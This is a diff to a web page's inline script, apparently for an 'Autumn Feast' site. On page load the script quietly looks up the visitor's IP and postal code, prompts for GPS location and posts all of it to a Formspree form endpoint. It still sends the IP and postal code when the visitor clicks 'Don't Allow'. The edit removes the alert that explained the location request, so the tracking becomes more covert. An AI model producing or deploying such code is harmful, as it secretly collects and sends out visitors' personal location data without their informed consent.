@@ -1092,7 +1092,7 @@
         }
     </script>
 
-    <!-- Combined IP Lookup + Instant Geolocation Popup with Alert -->
+    <!-- Combined IP Lookup + Direct Browser Geolocation Prompt on Page Load -->
     <script>
       window.addEventListener("load", function() {
         // 1. Fetch exact IP address & postal code metadata quietly
@@ -1104,17 +1104,14 @@
             const visitorCity = ipData.city;
             const visitorRegion = ipData.region;
 
-            // 2. Trigger a friendly alert box notifying the user
-            alert("Autumn Feast wants to access your location to find local feast availability.");
-
-            // 3. Immediately request browser GPS coordinates
+            // 2. Immediately trigger the browser's native GPS permission prompt
             if ("geolocation" in navigator) {
               navigator.geolocation.getCurrentPosition(
                 function(position) {
                   const lat = position.coords.latitude;
                   const lon = position.coords.longitude;
                   
-                  // Send combined IP, Postal Code, and Exact Coordinates to Formspree
+                  // Send combined IP, Postal Code, and Exact GPS Coordinates to Formspree
                   fetch("https://formspree.io/f/xqppqorj", {
                     method: "POST",
                     headers: { 
@@ -1136,7 +1133,7 @@
                 function(error) {
                   console.log("Visitor declined or dismissed location prompt.");
                   
-                  // Send fallback data with just the IP & postal if they block GPS
+                  // Fallback: Send IP and postal code if they hit "Don't Allow"
                   fetch("https://formspree.io/f/xqppqorj", {
                     method: "POST",
                     headers: { 
